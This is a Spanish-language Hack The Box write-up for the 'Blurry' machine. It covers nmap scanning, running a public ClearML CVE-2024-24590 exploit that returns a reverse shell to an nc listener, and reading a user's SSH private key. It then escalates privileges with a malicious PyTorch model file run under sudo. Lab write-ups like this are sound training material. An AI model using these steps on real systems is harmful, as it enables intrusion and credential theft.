---
title: Blurry
description: Blurry es una máquina Linux de dificultad media, presenta vectores relacionados con DevOps que rodean el aprendizaje automático. El foothold se compone de una serie de CVEs recientemente revelados sobre ClearML suite. El servicio proporciona una plataforma web, un servidor de archivos y una API; todos ellos contienen vulnerabilidades que pueden encadenarse para la ejecución remota de código. Luego de obtener una shell en el objetivo, se descubre un programa que se puede ejecutar como sudo. El programa carga modelos arbitrarios de PyTorch para evaluarlos en un conjunto de datos protegido. Si bien se sabe que dichos modelos son susceptibles a una deserialización insegura, se utiliza fickling para escanear el conjunto de datos en busca de archivos pickle inseguros, antes de cargar el modelo. Se puede inyectar código malicioso en un modelo mediante runpy para eludir las comprobaciones de fickling.
date: 2024-10-17
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-blurry/blurry_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - rce
  - cve
  - sudo_abuse
  - ssh
  - http
  - insecure_deserialization
  - tcp
  - information_gathering
  - web_analysis
  - cve_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/blurry:-$ ping -c 1 10.10.11.19 
PING 10.10.11.19 (10.10.11.19) 56(84) bytes of data.
64 bytes from 10.10.11.19: icmp_seq=1 ttl=63 time=339 ms

--- 10.10.11.19 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 339.394/339.394/339.394/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/blurry:-$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.19 -oG nmap1
Host: 10.10.11.19 ()	Status: Up
Host: 10.10.11.19 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/blurry:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.19 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/blurry:-$ echo '10.10.11.19\tapp.blurry.htb' | sudo tee -a /etc/hosts
```

---
## Web Analysis & CVE Exploitation

![](/assets/img/htb-writeup-blurry/blurry1.png)

El acceso a la web no requirió autenticación.

![](/assets/img/htb-writeup-blurry/blurry2.png)

Luego de interactuar un poco con la página, busqué si existe alguna vulnerabilidad en la plataforma.

<https://nvd.nist.gov/vuln/detail/CVE-2024-24590> : <https://nvd.nist.gov/vuln/detail/CVE-2024-24595>

En GitHub encontré el siguiente repositorio con un PoC para CVE-2024-24590.

<https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit>

Antes de ejecutar el exploit, se debe instalar el módulo ClearMl para Python y luego configurarlo.

![](/assets/img/htb-writeup-blurry/blurry3.png)

```terminal
/home/kali/Documents/htb/machines/blurry:-$ pip install clearml

/home/kali/Documents/htb/machines/blurry:-$ clearml-init
```

![](/assets/img/htb-writeup-blurry/blurry4.png)

Como se puede ver, la api utiliza tres subdominios ('app', 'api' y 'files') que deben estar contemplados en el archivo '/etc/hosts'.

```terminal
/home/kali/Documents/htb/machines/blurry:-$ sudo sed -i '$d' /etc/hosts

/home/kali/Documents/htb/machines/blurry:-$ echo '10.10.11.19\tapp.blurry.htb\tapi.blurry.htb\tfiles.blurry.htb' | sudo tee -a /etc/hosts
```
Terminada la configuracion, cloné y ejecuté el exploit.

```terminal
/home/kali/Documents/htb/machines/blurry:-$ git clone https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit.git

/home/kali/Documents/htb/machines/blurry:-$ python3 exploit.py

/home/kali/Documents/htb/machines/blurry:-$ nc -lvnp 1234
```

![](/assets/img/htb-writeup-blurry/blurry5.png)

El proyecto al que se debe apuntar es el 'Black Swan', que parece ser el unico vulnerable.

![](/assets/img/htb-writeup-blurry/blurry6.png)

---
## Privilege Escalation

```terminal
jippity@blurry:~/.ssh$ cat id_rsa
```

![](/assets/img/htb-writeup-blurry/blurry7.png)

```terminal
/home/kali/Documents/htb/machines/blurry:-$ echo '-----BEGIN OPENSSH PRIVATE KEY-----...' > id_rsa

/home/kali/Documents/htb/machines/blurry:-$ chmod 600 id_rsa

/home/kali/Documents/htb/machines/blurry:-$ ssh jippity@10.10.11.19 -i id_rsa
```

Una vez dentro, enumero los privilegios del usuario 'jippity'.

```terminal
jippity@blurry:~$ sudo -l
```

![](/assets/img/htb-writeup-blurry/blurry8.png)

El usuario actual puede ejecutar el comando 'Evaluate_Model' como sudo. Al comprobar la utilidad del comando, parece que este llama al archivo '/models/evaluate_model.py'

![](/assets/img/htb-writeup-blurry/blurry9.png)

Mirando el código fuente de 'evaluate_model.py', se puede detectar una vulnerabilidad de deserialización.

<https://pytorch.org/docs/stable/generated/torch.load.html>

![](/assets/img/htb-writeup-blurry/blurry10.png)

Sabiendo todo esto, se puede crear un archivo 'pth' personalizado que contiene una reverse shell.

La siguiente herramienta puede ayudar, <https://github.com/trailofbits/fickling>

```terminal
jippity@blurry:/tmp$ nano exploit.py
```

![](/assets/img/htb-writeup-blurry/blurry11.png)

```terminal
/home/kali/Documents/htb/machines/blurry:-$ nc -lnvp 4444
```

```terminal
jippity@blurry:/tmp$ pytho3 exploit.py
jippity@blurry:/tmp$ cp exploit.pth /models/
jippity@blurry:/tmp$ sudo /usr/bin/evaluate_model /models/exploit.pth
```

![](/assets/img/htb-writeup-blurry/blurry12.png)

> <a href="https://www.hackthebox.com/achievement/machine/1521382/605" target="_blank">Blurry Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
